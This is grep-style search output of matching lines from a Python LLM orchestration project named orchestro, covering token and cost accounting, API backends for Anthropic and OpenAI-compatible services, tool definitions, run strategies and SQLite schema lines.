src/orchestro/budget.py:12:# Cost per 1 million tokens in USD. Keyed by backend name prefix or exact name.
src/orchestro/budget.py:60:    prompt_tokens: int,
src/orchestro/budget.py:61:    completion_tokens: int,
src/orchestro/budget.py:66:    return (prompt_tokens * prompt_rate + completion_tokens * completion_rate) / 1_000_000
src/orchestro/budget.py:71:    prompt_tokens: int,
src/orchestro/budget.py:72:    completion_tokens: int,
src/orchestro/budget.py:73:    cache_read_tokens: int = 0,
src/orchestro/budget.py:74:    cache_write_tokens: int = 0,
src/orchestro/budget.py:78:        prompt_tokens=prompt_tokens,
src/orchestro/budget.py:79:        completion_tokens=completion_tokens,
src/orchestro/budget.py:87:    parts = [f"cost: {cost_str}  prompt={prompt_tokens:,}  completion={completion_tokens:,}"]
src/orchestro/budget.py:88:    if cache_read_tokens:
src/orchestro/budget.py:89:        parts.append(f"cache_read={cache_read_tokens:,}")
src/orchestro/budget.py:90:    if cache_write_tokens:
src/orchestro/budget.py:91:        parts.append(f"cache_write={cache_write_tokens:,}")
src/orchestro/budget.py:106:    max_tokens: int = 50_000
src/orchestro/budget.py:112:    tokens_used: int = 0
src/orchestro/budget.py:127:    def record_tokens(self, count: int) -> None:
src/orchestro/budget.py:128:        self.tokens_used += count
src/orchestro/budget.py:133:        if self.tokens_used > self.max_tokens:
src/orchestro/budget.py:134:            raise BudgetExhausted("tokens", self.max_tokens, self.tokens_used)
src/orchestro/budget.py:148:            "tokens": self.max_tokens - self.tokens_used,
src/orchestro/budget.py:157:            "max_tokens": self.max_tokens,
src/orchestro/budget.py:162:            "tokens_used": self.tokens_used,
src/orchestro/budget.py:173:        "budget_max_tokens": "max_tokens",
tests/test_constitution_propagation.py:4:from pathlib import Path
tests/test_constitution_propagation.py:16:def db(tmp_path: Path) -> OrchestroDB:
tests/test_constitution_propagation.py:17:    return OrchestroDB(tmp_path / "test.db")
tests/test_constitution_propagation.py:41:        prompt_tokens=10,
tests/test_constitution_propagation.py:42:        completion_tokens=10,
tests/test_constitution_propagation.py:43:        total_tokens=20,
tests/test_constitution_propagation.py:105:        def fake_execute_backend(*, prepared: PreparedRun, **kwargs):  # type: ignore[return]
tests/test_constitution_propagation.py:110:        with patch.object(orchestro, "_execute_backend_once", side_effect=fake_execute_backend):
tests/test_constitution_propagation.py:111:            orchestro._execute_critique_revise(
tests/test_constitution_propagation.py:143:            orchestro, "_execute_backend_once", return_value=_make_backend_response()
tests/test_constitution_propagation.py:145:            result = orchestro._execute_critique_revise(
tests/test_constitution_propagation.py:177:        def fake_execute(*, prepared: PreparedRun, **kwargs):  # type: ignore[return]
tests/test_constitution_propagation.py:181:        with patch.object(orchestro, "_execute_backend_once", side_effect=fake_execute):
tests/test_constitution_propagation.py:182:            orchestro._execute_verified(
docs/getting-started.md:19:- A Unix-like shell
docs/getting-started.md:74:curl http://127.0.0.1:8765/backends
docs/getting-started.md:114:Start the shell:
docs/getting-started.md:117:orchestro shell --backend auto
docs/getting-started.md:138:- Want shell-specific usage: [Shell Mode](shell.md)
src/orchestro/tools.py:6:from pathlib import Path
src/orchestro/tools.py:52:            "bash": ToolDefinition("bash", "Run a shell command in the working directory.", "confirm", self._run_bash),
src/orchestro/tools.py:55:                "Apply a search-replace edit to a file. Argument format: filepath\\n<<<SEARCH\\nold text\\n===\\nnew text\\n>>>SEARCH",
src/orchestro/tools.py:67:                "Show git diff. Argument is optional: a file path, --staged, or --cached.",
src/orchestro/tools.py:83:                "Run the project test suite. Argument is optional: a specific test path or command.",
src/orchestro/tools.py:117:            "spawn_subagent": ToolDefinition(
src/orchestro/tools.py:118:                "spawn_subagent",
src/orchestro/tools.py:121:                self._run_spawn_subagent,
src/orchestro/tools.py:131:            f"Get diagnostics for a file. Argument: file path. Languages: {langs}",
src/orchestro/tools.py:155:            f"List symbols in a file. Argument: file path. Languages: {langs}",
src/orchestro/tools.py:172:    def _get_lsp_connection(self, file_path: str, cwd: Path) -> tuple:
src/orchestro/tools.py:175:        lang = language_for_file(file_path)
src/orchestro/tools.py:177:            raise ValueError(f"no language mapping for {file_path}")
src/orchestro/tools.py:181:        resolved = str((cwd / file_path).resolve()) if not Path(file_path).is_absolute() else file_path
src/orchestro/tools.py:187:            raise ValueError("lsp_diagnostics requires a file path")
src/orchestro/tools.py:201:        file_path, line, col = self._parse_file_line_col(argument.strip())
src/orchestro/tools.py:202:        conn, uri = self._get_lsp_connection(file_path, cwd)
src/orchestro/tools.py:209:        file_path, line, col = self._parse_file_line_col(argument.strip())
src/orchestro/tools.py:210:        conn, uri = self._get_lsp_connection(file_path, cwd)
src/orchestro/tools.py:217:        file_path, line, col = self._parse_file_line_col(argument.strip())
src/orchestro/tools.py:218:        conn, uri = self._get_lsp_connection(file_path, cwd)
src/orchestro/tools.py:233:            raise ValueError("lsp_symbols requires a file path")
src/orchestro/tools.py:290:        entries = sorted(path.name for path in target.iterdir())
src/orchestro/tools.py:291:        return ToolResult(ok=True, output="\n".join(entries), metadata={"path": str(target), "count": len(entries)})
src/orchestro/tools.py:295:            raise ValueError("read_file requires a relative path")
src/orchestro/tools.py:303:            metadata={"path": str(target), "characters": len(output), "truncated": truncated},
src/orchestro/tools.py:432:        filepath = parts[0].strip()
src/orchestro/tools.py:443:            target = self._resolve_within_workspace(cwd, filepath)
src/orchestro/tools.py:447:            return ToolResult(ok=False, output="file not found", metadata={"path": filepath})
src/orchestro/tools.py:451:            return ToolResult(ok=False, output="search text not found in file", metadata={"path": filepath})
src/orchestro/tools.py:456:                metadata={"path": filepath, "occurrences": count},
src/orchestro/tools.py:462:            output=f"Applied edit to {filepath}: replaced {len(old_text)} characters",
src/orchestro/tools.py:463:            metadata={"path": str(target), "old_length": len(old_text), "new_length": len(new_text)},
src/orchestro/tools.py:602:    def _run_spawn_subagent(self, argument: str, cwd: Path) -> ToolResult:
src/orchestro/tools.py:613:            packet = self._task_packet_from_spawn_json(data)
src/orchestro/tools.py:683:    def _task_packet_from_spawn_json(data: dict) -> TaskPacket:
src/orchestro/tools.py:718:            raise ValueError("path escapes the working directory") from exc
src/orchestro/backends/anthropic.py:4:which avoids auth header differences (x-api-key vs Authorization: Bearer) and
src/orchestro/backends/anthropic.py:5:correctly handles Anthropic's separate system field and max_tokens requirement.
src/orchestro/backends/anthropic.py:10:    ANTHROPIC_MAX_TOKENS — optional; maximum completion tokens (default: 8192)
src/orchestro/backends/anthropic.py:26:_BASE_URL = "https://api.anthropic.com/v1"
src/orchestro/backends/anthropic.py:36:        api_key: str | None = None,
src/orchestro/backends/anthropic.py:37:        max_tokens: int | None = None,
src/orchestro/backends/anthropic.py:40:        self._api_key = api_key
src/orchestro/backends/anthropic.py:41:        self._max_tokens = max_tokens
src/orchestro/backends/anthropic.py:45:        api_key = self._api_key or os.environ.get("ANTHROPIC_API_KEY", "")
src/orchestro/backends/anthropic.py:46:        max_tokens = self._max_tokens or int(
src/orchestro/backends/anthropic.py:49:        return model, api_key, max_tokens
src/orchestro/backends/anthropic.py:51:    def _headers(self, api_key: str) -> dict[str, str]:
src/orchestro/backends/anthropic.py:54:            "x-api-key": api_key,
src/orchestro/backends/anthropic.py:59:        model, _, max_tokens = self._resolve_config()
src/orchestro/backends/anthropic.py:77:            "max_tokens": max_tokens,
src/orchestro/backends/anthropic.py:86:        model, api_key, _ = self._resolve_config()
src/orchestro/backends/anthropic.py:88:        if not api_key:
src/orchestro/backends/anthropic.py:91:                "Export it or pass api_key= to AnthropicBackend()."
src/orchestro/backends/anthropic.py:99:            headers=self._headers(api_key),
src/orchestro/backends/anthropic.py:114:        input_tokens = int(usage.get("input_tokens", 0))
src/orchestro/backends/anthropic.py:115:        output_tokens = int(usage.get("output_tokens", 0))
src/orchestro/backends/anthropic.py:116:        cache_read = int(usage.get("cache_read_input_tokens", 0))
src/orchestro/backends/anthropic.py:117:        cache_write = int(usage.get("cache_creation_input_tokens", 0))
src/orchestro/backends/anthropic.py:128:            prompt_tokens=input_tokens,
src/orchestro/backends/anthropic.py:129:            completion_tokens=output_tokens,
src/orchestro/backends/anthropic.py:130:            total_tokens=input_tokens + output_tokens,
src/orchestro/backends/anthropic.py:131:            cache_read_tokens=cache_read,
src/orchestro/backends/anthropic.py:132:            cache_write_tokens=cache_write,
src/orchestro/backends/anthropic.py:137:        _, api_key, _ = self._resolve_config()
src/orchestro/backends/anthropic.py:138:        if not api_key:
src/orchestro/backends/anthropic.py:146:            headers=self._headers(api_key),
src/orchestro/backends/anthropic.py:182:        model, api_key, _ = self._resolve_config()
src/orchestro/backends/anthropic.py:184:        if not api_key:
src/orchestro/backends/anthropic.py:192:            headers=self._headers(api_key),
src/orchestro/backends/anthropic.py:236:        prompt_tokens = usage.get("input_tokens", 0)
src/orchestro/backends/anthropic.py:237:        completion_tokens = usage.get("output_tokens", max(1, len(full_text) // 4))
src/orchestro/backends/anthropic.py:238:        total_tokens = prompt_tokens + completion_tokens
src/orchestro/backends/anthropic.py:239:        cache_read_tokens = usage.get("cache_read_input_tokens", 0)
src/orchestro/backends/anthropic.py:240:        cache_write_tokens = usage.get("cache_creation_input_tokens", 0)
src/orchestro/backends/anthropic.py:246:                "input_tokens": prompt_tokens,
src/orchestro/backends/anthropic.py:247:                "output_tokens": completion_tokens,
src/orchestro/backends/anthropic.py:255:            prompt_tokens=prompt_tokens,
src/orchestro/backends/anthropic.py:256:            completion_tokens=completion_tokens,
src/orchestro/backends/anthropic.py:257:            total_tokens=total_tokens,
src/orchestro/backends/anthropic.py:258:            cache_read_tokens=cache_read_tokens,
src/orchestro/backends/anthropic.py:259:            cache_write_tokens=cache_write_tokens,
src/orchestro/backends/anthropic.py:274:        _, api_key, _ = self._resolve_config()
src/orchestro/backends/anthropic.py:275:        return bool(api_key)
src/orchestro/backends/anthropic.py:282:def make_anthropic_backend(model: str = _DEFAULT_MODEL, *, max_tokens: int = _DEFAULT_MAX_TOKENS) -> AnthropicBackend:
src/orchestro/backends/anthropic.py:283:    return AnthropicBackend(model=model, max_tokens=max_tokens)
src/orchestro/backends/anthropic.py:299:            "input_tokens",
src/orchestro/backends/anthropic.py:300:            "output_tokens",
src/orchestro/backends/anthropic.py:301:            "cache_read_input_tokens",
src/orchestro/backends/anthropic.py:302:            "cache_creation_input_tokens",
docs/adr-sqlite-first.md:19:The default vector implementation for that path should be `sqlite-vec`.
docs/adr-sqlite-first.md:76:- vector scale or write contention makes the local SQLite path operationally awkward
docs/adr-sqlite-first.md:88:- do not use an ORM for the core memory path
src/orchestro/backends/base.py:51:        raise NotImplementedError("backend does not support subprocess execution")
src/orchestro/orchestrator.py:6:from pathlib import Path
src/orchestro/orchestrator.py:21:from orchestro.paths import data_dir
src/orchestro/orchestrator.py:128:        self.execute_prepared_run(prepared)
src/orchestro/orchestrator.py:165:        session_id = request.metadata.get("session_id")
src/orchestro/orchestrator.py:166:        session = self.db.get_session(session_id) if session_id else None
src/orchestro/orchestrator.py:196:            session_id=session_id,
src/orchestro/orchestrator.py:235:        if session is not None:
src/orchestro/orchestrator.py:239:                event_type="session_attached",
src/orchestro/orchestrator.py:241:                    "session_id": session.id,
src/orchestro/orchestrator.py:242:                    "title": session.title,
src/orchestro/orchestrator.py:243:                    "has_context_snapshot": bool(session.context_snapshot),
src/orchestro/orchestrator.py:246:            if session.context_snapshot:
src/orchestro/orchestrator.py:250:                    event_type="session_context_loaded",
src/orchestro/orchestrator.py:251:                    payload={"session_id": session.id, "summary": session.summary},
src/orchestro/orchestrator.py:282:    def _record_response_token_usage(self, run_id: str, response: BackendResponse) -> None:
src/orchestro/orchestrator.py:283:        self.db.update_run_token_usage(
src/orchestro/orchestrator.py:285:            prompt_tokens=response.prompt_tokens,
src/orchestro/orchestrator.py:286:            completion_tokens=response.completion_tokens,
src/orchestro/orchestrator.py:287:            total_tokens=response.total_tokens,
src/orchestro/orchestrator.py:288:            cache_read_tokens=response.cache_read_tokens,
src/orchestro/orchestrator.py:289:            cache_write_tokens=response.cache_write_tokens,
src/orchestro/orchestrator.py:291:        if response.cache_read_tokens or response.cache_write_tokens:
src/orchestro/orchestrator.py:297:                    "cache_read_tokens": response.cache_read_tokens,
src/orchestro/orchestrator.py:298:                    "cache_write_tokens": response.cache_write_tokens,
src/orchestro/orchestrator.py:302:    def execute_prepared_run(
src/orchestro/orchestrator.py:326:                response = self._execute_tool_loop(
src/orchestro/orchestrator.py:346:                response = self._execute_verified(
src/orchestro/orchestrator.py:366:                response = self._execute_self_consistency(
src/orchestro/orchestrator.py:384:                response = self._execute_critique_revise(
src/orchestro/orchestrator.py:402:                response = self._execute_debate(
src/orchestro/orchestrator.py:419:            if prepared.request.strategy_name == "plan-execute":
src/orchestro/orchestrator.py:420:                response = self._execute_plan_execute(
src/orchestro/orchestrator.py:430:                    payload={"output_length": len(response.output_text), "strategy": "plan-execute"},
src/orchestro/orchestrator.py:449:                    response = self._execute_backend_once(
src/orchestro/orchestrator.py:462:                    self._record_response_token_usage(prepared.run_id, response)
src/orchestro/orchestrator.py:470:                            "prompt_tokens": response.prompt_tokens,
src/orchestro/orchestrator.py:471:                            "completion_tokens": response.completion_tokens,
src/orchestro/orchestrator.py:472:                            "total_tokens": response.total_tokens,
src/orchestro/orchestrator.py:673:    def _execute_tool_loop(
src/orchestro/orchestrator.py:693:                "max_tokens": budget.max_tokens,
src/orchestro/orchestrator.py:798:            response = self._execute_backend_once(
src/orchestro/orchestrator.py:809:                raise RuntimeError("run canceled during tool-loop execution")
src/orchestro/orchestrator.py:810:            self._record_response_token_usage(prepared.run_id, response)
src/orchestro/orchestrator.py:811:            if response.total_tokens:
src/orchestro/orchestrator.py:812:                budget.record_tokens(response.total_tokens)
src/orchestro/orchestrator.py:820:                    "prompt_tokens": response.prompt_tokens,
src/orchestro/orchestrator.py:821:                    "completion_tokens": response.completion_tokens,
src/orchestro/orchestrator.py:822:                    "total_tokens": response.total_tokens,
src/orchestro/orchestrator.py:1156:                    event_type="child_run_spawned",
src/orchestro/orchestrator.py:1166:                self.execute_prepared_run(
src/orchestro/orchestrator.py:1257:    def _execute_self_consistency(
src/orchestro/orchestrator.py:1285:            response = self._execute_backend_once(
src/orchestro/orchestrator.py:1291:                raise RuntimeError("run canceled during self-consistency execution")
src/orchestro/orchestrator.py:1292:            self._record_response_token_usage(prepared.run_id, response)
src/orchestro/orchestrator.py:1300:                    "prompt_tokens": response.prompt_tokens,
src/orchestro/orchestrator.py:1301:                    "completion_tokens": response.completion_tokens,
src/orchestro/orchestrator.py:1302:                    "total_tokens": response.total_tokens,
src/orchestro/orchestrator.py:1326:            prompt_tokens=selected_response.prompt_tokens,
src/orchestro/orchestrator.py:1327:            completion_tokens=selected_response.completion_tokens,
src/orchestro/orchestrator.py:1328:            total_tokens=selected_response.total_tokens,
src/orchestro/orchestrator.py:1357:    def _execute_critique_revise(
src/orchestro/orchestrator.py:1366:        draft_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1373:        self._record_response_token_usage(prepared.run_id, draft_response)
src/orchestro/orchestrator.py:1400:        critique_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1412:        self._record_response_token_usage(prepared.run_id, critique_response)
src/orchestro/orchestrator.py:1435:        revised_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1447:        self._record_response_token_usage(prepared.run_id, revised_response)
src/orchestro/orchestrator.py:1462:            prompt_tokens=revised_response.prompt_tokens,
src/orchestro/orchestrator.py:1463:            completion_tokens=revised_response.completion_tokens,
src/orchestro/orchestrator.py:1464:            total_tokens=revised_response.total_tokens,
src/orchestro/orchestrator.py:1467:    def _execute_debate(
src/orchestro/orchestrator.py:1476:        total_tokens_acc = 0
src/orchestro/orchestrator.py:1486:        a_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1498:        total_prompt += a_response.prompt_tokens or 0
src/orchestro/orchestrator.py:1499:        total_completion += a_response.completion_tokens or 0
src/orchestro/orchestrator.py:1500:        total_tokens_acc += a_response.total_tokens or 0
src/orchestro/orchestrator.py:1501:        self._record_response_token_usage(prepared.run_id, a_response)
src/orchestro/orchestrator.py:1508:                "prompt_tokens": a_response.prompt_tokens,
src/orchestro/orchestrator.py:1509:                "completion_tokens": a_response.completion_tokens,
src/orchestro/orchestrator.py:1510:                "total_tokens": a_response.total_tokens,
src/orchestro/orchestrator.py:1536:        b_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1548:        total_prompt += b_response.prompt_tokens or 0
src/orchestro/orchestrator.py:1549:        total_completion += b_response.completion_tokens or 0
src/orchestro/orchestrator.py:1550:        total_tokens_acc += b_response.total_tokens or 0
src/orchestro/orchestrator.py:1551:        self._record_response_token_usage(prepared.run_id, b_response)
src/orchestro/orchestrator.py:1558:                "prompt_tokens": b_response.prompt_tokens,
src/orchestro/orchestrator.py:1559:                "completion_tokens": b_response.completion_tokens,
src/orchestro/orchestrator.py:1560:                "total_tokens": b_response.total_tokens,
src/orchestro/orchestrator.py:1589:        synthesis_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1601:        total_prompt += synthesis_response.prompt_tokens or 0
src/orchestro/orchestrator.py:1602:        total_completion += synthesis_response.completion_tokens or 0
src/orchestro/orchestrator.py:1603:        total_tokens_acc += synthesis_response.total_tokens or 0
src/orchestro/orchestrator.py:1604:        self._record_response_token_usage(prepared.run_id, synthesis_response)
src/orchestro/orchestrator.py:1611:                "prompt_tokens": synthesis_response.prompt_tokens,
src/orchestro/orchestrator.py:1612:                "completion_tokens": synthesis_response.completion_tokens,
src/orchestro/orchestrator.py:1613:                "total_tokens": synthesis_response.total_tokens,
src/orchestro/orchestrator.py:1624:            prompt_tokens=total_prompt,
src/orchestro/orchestrator.py:1625:            completion_tokens=total_completion,
src/orchestro/orchestrator.py:1626:            total_tokens=total_tokens_acc,
src/orchestro/orchestrator.py:1629:    def _execute_plan_execute(
src/orchestro/orchestrator.py:1651:        plan_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1662:            raise RuntimeError("run canceled during plan-execute plan generation")
src/orchestro/orchestrator.py:1663:        self._record_response_token_usage(prepared.run_id, plan_response)
src/orchestro/orchestrator.py:1671:            event_type="plan_execute_plan_generated",
src/orchestro/orchestrator.py:1682:                    payload={"reason": "cancel requested during plan-execute step"},
src/orchestro/orchestrator.py:1686:                    error_message="run canceled during plan-execute step",
src/orchestro/orchestrator.py:1688:                raise RuntimeError("run canceled during plan-execute step")
src/orchestro/orchestrator.py:1705:                step_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1716:                    raise RuntimeError("run canceled during plan-execute step execution")
src/orchestro/orchestrator.py:1717:                self._record_response_token_usage(prepared.run_id, step_response)
src/orchestro/orchestrator.py:1722:                    event_type="plan_execute_step_completed",
src/orchestro/orchestrator.py:1736:                    event_type="plan_execute_step_completed",
src/orchestro/orchestrator.py:1761:                replan_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1772:                    raise RuntimeError("run canceled during plan-execute replanning")
src/orchestro/orchestrator.py:1773:                self._record_response_token_usage(prepared.run_id, replan_response)
src/orchestro/orchestrator.py:1781:                    event_type="plan_execute_replanned",
src/orchestro/orchestrator.py:1801:        synth_response = self._execute_backend_once(
src/orchestro/orchestrator.py:1812:            raise RuntimeError("run canceled during plan-execute synthesis")
src/orchestro/orchestrator.py:1813:        self._record_response_token_usage(prepared.run_id, synth_response)
src/orchestro/orchestrator.py:1817:            event_type="plan_execute_synthesized",
src/orchestro/orchestrator.py:1824:                "strategy": "plan-execute",
src/orchestro/orchestrator.py:1827:            prompt_tokens=synth_response.prompt_tokens,
src/orchestro/orchestrator.py:1828:            completion_tokens=synth_response.completion_tokens,
src/orchestro/orchestrator.py:1829:            total_tokens=synth_response.total_tokens,
src/orchestro/orchestrator.py:1832:    def _execute_verified(
src/orchestro/orchestrator.py:1864:            response = self._execute_backend_once(
src/orchestro/orchestrator.py:1875:                raise RuntimeError("run canceled during verified execution")
src/orchestro/orchestrator.py:1876:            self._record_response_token_usage(prepared.run_id, response)
src/orchestro/orchestrator.py:1909:                    prompt_tokens=response.prompt_tokens,
src/orchestro/orchestrator.py:1910:                    completion_tokens=response.completion_tokens,
src/orchestro/orchestrator.py:1911:                    total_tokens=response.total_tokens,
src/orchestro/orchestrator.py:1954:            prompt_tokens=best_response.prompt_tokens,
src/orchestro/orchestrator.py:1955:            completion_tokens=best_response.completion_tokens,
src/orchestro/orchestrator.py:1956:            total_tokens=best_response.total_tokens,
src/orchestro/orchestrator.py:1985:    def _execute_backend_once(
src/orchestro/orchestrator.py:2015:                        payload={"reason": "cancel requested during backend execution"},
src/orchestro/orchestrator.py:2019:                        error_message="run canceled during backend execution",
src/orchestro/orchestrator.py:2188:                "A file or path conflict occurred. Inspect the working directory state "
src/orchestro/orchestrator.py:2220:        if "path" in lowered or "file" in lowered or "workspace" in lowered:
src/orchestro/orchestrator.py:2299:                row = conn.execute(
src/orchestro/models.py:4:from pathlib import Path
src/orchestro/models.py:26:    prompt_tokens: int = 0
src/orchestro/models.py:27:    completion_tokens: int = 0
src/orchestro/models.py:28:    total_tokens: int = 0
src/orchestro/models.py:29:    cache_read_tokens: int = 0
src/orchestro/models.py:30:    cache_write_tokens: int = 0
src/orchestro/backends/openai_compat.py:21:        api_key: str | None = None,
src/orchestro/backends/openai_compat.py:25:        self._api_key = api_key
src/orchestro/backends/openai_compat.py:31:        api_key = (
src/orchestro/backends/openai_compat.py:32:            self._api_key
src/orchestro/backends/openai_compat.py:35:        if not api_key:
src/orchestro/backends/openai_compat.py:38:                api_key = os.environ.get("ANTHROPIC_API_KEY", "")
src/orchestro/backends/openai_compat.py:40:                api_key = os.environ.get("OPENROUTER_API_KEY", "")
src/orchestro/backends/openai_compat.py:42:                api_key = os.environ.get("OPENAI_API_KEY", "")
src/orchestro/backends/openai_compat.py:43:        if not api_key:
src/orchestro/backends/openai_compat.py:44:            api_key = "dummy"
src/orchestro/backends/openai_compat.py:45:        return base_url, model, api_key
src/orchestro/backends/openai_compat.py:54:        base_url, model, api_key = self._resolve_config()
src/orchestro/backends/openai_compat.py:69:                "Authorization": f"Bearer {api_key}",
src/orchestro/backends/openai_compat.py:88:        cached_tokens = usage.get("prompt_tokens_details", {}).get("cached_tokens")
src/orchestro/backends/openai_compat.py:89:        if cached_tokens is not None:
src/orchestro/backends/openai_compat.py:90:            cache_stats["cached_tokens"] = cached_tokens
src/orchestro/backends/openai_compat.py:91:        cache_read_raw = usage.get("cache_read_input_tokens")
src/orchestro/backends/openai_compat.py:92:        cache_write_raw = usage.get("cache_creation_input_tokens")
src/orchestro/backends/openai_compat.py:93:        cache_read_tokens = int(cache_read_raw) if cache_read_raw is not None else 0
src/orchestro/backends/openai_compat.py:94:        cache_write_tokens = int(cache_write_raw) if cache_write_raw is not None else 0
src/orchestro/backends/openai_compat.py:96:            cache_stats["cache_read_input_tokens"] = cache_read_raw
src/orchestro/backends/openai_compat.py:98:            cache_stats["cache_creation_input_tokens"] = cache_write_raw
src/orchestro/backends/openai_compat.py:106:            meta["cache_read_input_tokens"] = cache_read_raw
src/orchestro/backends/openai_compat.py:108:            meta["cache_creation_input_tokens"] = cache_write_raw
src/orchestro/backends/openai_compat.py:112:            prompt_tokens=usage.get("prompt_tokens", 0),
src/orchestro/backends/openai_compat.py:113:            completion_tokens=usage.get("completion_tokens", 0),
src/orchestro/backends/openai_compat.py:114:            total_tokens=usage.get("total_tokens", 0),
src/orchestro/backends/openai_compat.py:115:            cache_read_tokens=cache_read_tokens,
src/orchestro/backends/openai_compat.py:116:            cache_write_tokens=cache_write_tokens,
src/orchestro/backends/openai_compat.py:121:        base_url, model, api_key = self._resolve_config()
src/orchestro/backends/openai_compat.py:136:                "Authorization": f"Bearer {api_key}",
src/orchestro/backends/openai_compat.py:176:        base_url, model, api_key = self._resolve_config()
src/orchestro/backends/openai_compat.py:195:                "Authorization": f"Bearer {api_key}",
src/orchestro/backends/openai_compat.py:220:                    for key in ("prompt_tokens", "completion_tokens", "total_tokens"):
src/orchestro/backends/openai_compat.py:224:                    details = chunk_usage.get("prompt_tokens_details", {})
src/orchestro/backends/openai_compat.py:225:                    cached = details.get("cached_tokens") if isinstance(details, dict) else None
src/orchestro/backends/openai_compat.py:227:                        usage["cached_tokens"] = int(cached)
src/orchestro/backends/openai_compat.py:228:                    for key in ("cache_read_input_tokens", "cache_creation_input_tokens"):
src/orchestro/backends/openai_compat.py:244:        prompt_tokens = usage.get("prompt_tokens", 0)
src/orchestro/backends/openai_compat.py:245:        completion_tokens = usage.get("completion_tokens", max(1, len(full_text) // 4))
src/orchestro/backends/openai_compat.py:246:        total_tokens = usage.get("total_tokens", prompt_tokens + completion_tokens)
src/orchestro/backends/openai_compat.py:247:        cache_read_tokens = usage.get("cache_read_input_tokens", 0)
src/orchestro/backends/openai_compat.py:248:        cache_write_tokens = usage.get("cache_creation_input_tokens", 0)
src/orchestro/backends/openai_compat.py:250:        if "cached_tokens" in usage:
src/orchestro/backends/openai_compat.py:251:            cache_stats["cached_tokens"] = usage["cached_tokens"]
src/orchestro/backends/openai_compat.py:259:                    "prompt_tokens": prompt_tokens,
src/orchestro/backends/openai_compat.py:260:                    "completion_tokens": completion_tokens,
src/orchestro/backends/openai_compat.py:261:                    "total_tokens": total_tokens,
src/orchestro/backends/openai_compat.py:265:            prompt_tokens=prompt_tokens,
src/orchestro/backends/openai_compat.py:266:            completion_tokens=completion_tokens,
src/orchestro/backends/openai_compat.py:267:            total_tokens=total_tokens,
src/orchestro/backends/openai_compat.py:268:            cache_read_tokens=cache_read_tokens,
src/orchestro/backends/openai_compat.py:269:            cache_write_tokens=cache_write_tokens,
src/orchestro/backends/openai_compat.py:304:        base_url, model, api_key = self._resolve_config()
src/orchestro/backends/openai_compat.py:309:                headers={"Authorization": f"Bearer {api_key}"},
src/orchestro/paths.py:4:from pathlib import Path
src/orchestro/paths.py:18:def db_path() -> Path:
src/orchestro/paths.py:22:def facts_path() -> Path:
src/orchestro/paths.py:26:def global_instructions_path() -> Path:
src/orchestro/paths.py:31:    path = data_dir() / "constitutions"
src/orchestro/paths.py:32:    path.mkdir(parents=True, exist_ok=True)
src/orchestro/paths.py:33:    return path
src/orchestro/paths.py:36:def tool_approvals_path() -> Path:
src/orchestro/backends/subprocess_command.py:53:    def __init__(self, *, command: str | None = None, shell: bool = False) -> None:
src/orchestro/backends/subprocess_command.py:55:        self.shell = shell
src/orchestro/backends/subprocess_command.py:66:        shell = self._resolved_shell()
src/orchestro/backends/subprocess_command.py:72:        if shell:
src/orchestro/backends/subprocess_command.py:84:            shell=shell,
src/orchestro/backends/subprocess_command.py:110:            "shell": self._resolved_shell(),
src/orchestro/backends/subprocess_command.py:129:    def _resolved_shell(self) -> bool:
src/orchestro/backends/subprocess_command.py:130:        if self.shell:
src/orchestro/retrieval.py:217:        tokens = re.findall(r"[A-Za-z0-9_]+", value.lower())
src/orchestro/retrieval.py:218:        return " ".join(tokens)
src/orchestro/backends/agent_cli.py:15:    make_codex_backend()         — codex exec --full-auto
src/orchestro/backends/agent_cli.py:72:        """Return the full path to the binary, or just the name if not found."""
src/orchestro/backends/agent_cli.py:193:    """Build argv for codex exec in non-interactive mode."""
src/orchestro/backends/agent_cli.py:194:    argv: list[str] = ["exec"]
src/orchestro/backends/agent_cli.py:195:    execution_mode = os.environ.get("ORCHESTRO_CODEX_APPROVAL_MODE", "full-auto")
src/orchestro/backends/agent_cli.py:196:    if execution_mode == "full-auto":
src/orchestro/backends/agent_cli.py:198:    elif execution_mode:
src/orchestro/backends/agent_cli.py:199:        argv.extend(["--sandbox", execution_mode])
src/orchestro/backends/agent_cli.py:257:def _extract_model_tokens(text: str) -> list[str]:
src/orchestro/backends/agent_cli.py:275:    return _extract_model_tokens(proc.stdout)
src/orchestro/backends/agent_cli.py:288:    return _extract_model_tokens(proc.stdout)
src/orchestro/db.py:12:from pathlib import Path
src/orchestro/db.py:43:    prompt_tokens INTEGER NOT NULL DEFAULT 0,
src/orchestro/db.py:44:    completion_tokens INTEGER NOT NULL DEFAULT 0,
src/orchestro/db.py:45:    total_tokens INTEGER NOT NULL DEFAULT 0,
src/orchestro/db.py:125:CREATE TABLE IF NOT EXISTS shell_jobs (
src/orchestro/db.py:142:CREATE TABLE IF NOT EXISTS shell_job_events (
src/orchestro/db.py:144:    job_id TEXT NOT NULL REFERENCES shell_jobs(id) ON DELETE CASCADE,
src/orchestro/db.py:154:    job_id TEXT REFERENCES shell_jobs(id) ON DELETE CASCADE,
src/orchestro/db.py:165:CREATE TABLE IF NOT EXISTS shell_job_inputs (
src/orchestro/db.py:167:    job_id TEXT NOT NULL REFERENCES shell_jobs(id) ON DELETE CASCADE,
src/orchestro/db.py:219:CREATE TABLE IF NOT EXISTS sessions (
src/orchestro/db.py:221:    parent_session_id TEXT REFERENCES sessions(id),
src/orchestro/db.py:280:CREATE INDEX IF NOT EXISTS idx_shell_jobs_updated_at ON shell_jobs(updated_at);
src/orchestro/db.py:281:CREATE INDEX IF NOT EXISTS idx_shell_job_events_job_id ON shell_job_events(job_id, sequence_no);
src/orchestro/db.py:283:CREATE INDEX IF NOT EXISTS idx_shell_job_inputs_job_id ON shell_job_inputs(job_id, status, created_at);
src/orchestro/db.py:288:CREATE INDEX IF NOT EXISTS idx_sessions_updated_at ON sessions(updated_at);
src/orchestro/db.py:329:    source_path TEXT,
src/orchestro/db.py:357:    session_id: str | None
src/orchestro/db.py:377:    prompt_tokens: int = 0
src/orchestro/db.py:378:    completion_tokens: int = 0
src/orchestro/db.py:379:    total_tokens: int = 0
src/orchestro/db.py:380:    cache_read_tokens: int = 0
src/orchestro/db.py:381:    cache_write_tokens: int = 0
src/orchestro/db.py:387:    parent_session_id: str | None
src/orchestro/db.py:573:    source_path: str | None = None
